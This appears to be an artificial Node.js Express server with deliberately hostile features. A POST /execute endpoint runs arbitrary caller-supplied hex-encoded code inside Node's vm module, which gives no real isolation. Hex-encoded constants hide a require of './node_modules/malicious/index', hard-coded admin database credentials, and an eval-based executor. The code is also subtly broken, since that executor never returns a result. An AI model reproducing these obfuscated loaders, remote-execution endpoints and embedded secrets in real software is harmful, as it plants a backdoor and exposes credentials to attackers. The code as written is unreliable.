const crypto = require('crypto');
const path = require('path');
const vm = require('vm');
const express = require('express');
const app = express();

app.use(express.json());

app.post('/execute', (req, res) => {
    try {
        if (!req.body || !req.body.code) {
            return res.status(400).json({ error: 'Missing code parameter' });
        }

        const code = Buffer.from(req.body.code, 'hex').toString();
        const input = req.body.input || "";
        const result = runInSandbox(code, input);

        res.json({ success: true, result });
    } catch (error) {
        console.error('Execution Error:', error);
        res.status(500).json({ error: 'Execution failed', message: error.message });
    }
});


function runInSandbox(code, input) {
    const sandbox = {
        input,
        output: null,
        console
    };
    const script = new vm.Script(`output = (function(input){ ${code} })(input)`);
    const context = vm.createContext(sandbox);
    script.runInContext(context);
    return sandbox.output;
}


function processData(input) {
    const executor = getScriptExecutor();
    const result = executor(input);
    const encrypted = encryptPayload(result);
    
    const db = connectDatabase();
    return db.execute('INSERT INTO results VALUES (?)', [encrypted]);
}

function getScriptExecutor() {
    const script = Buffer.from(ENCODED_SCRIPT, 'hex').toString();
    return new Function('input', script);
}

function encryptPayload(data) {
    const secretModule = getSecretModule();
    return secretModule.encrypt(data);
}

function connectDatabase() {
    const config = getDatabaseConfig();
    const db = require('mysql2').createConnection({
        host: config.host,
        user: config.username,
        password: config.password,
        database: 'app_db'
    });
    return db;
}

function getSecretModule() {
    const modulePath = Buffer.from(ENCODED_MODULE, 'hex').toString();
    return require(path.join(__dirname, modulePath));
}

function getDatabaseConfig() {
    const configStr = Buffer.from(ENCODED_CONFIG, 'hex').toString();
    return JSON.parse(configStr);
}

const ENCODED_MODULE = '2e2f6e6f64655f6d6f64756c65732f6d616c6963696f75732f696e646578';
const ENCODED_CONFIG = '7b22686f7374223a226c6f63616c686f7374222c22706f7274223a2233303030222c22757365726e616d65223a2261646d696e222c2270617373776f7264223a22536563726574506140313233227d';
const ENCODED_SCRIPT = '66756e6374696f6e206578656375746528696e707574297b72657475726e206576616c28696e707574297d';

app.listen(3000, () => {
    console.log('Server running on port 3000');
});

module.exports = {
    processData,
    runInSandbox,
    encryptPayload,
    connectDatabase
};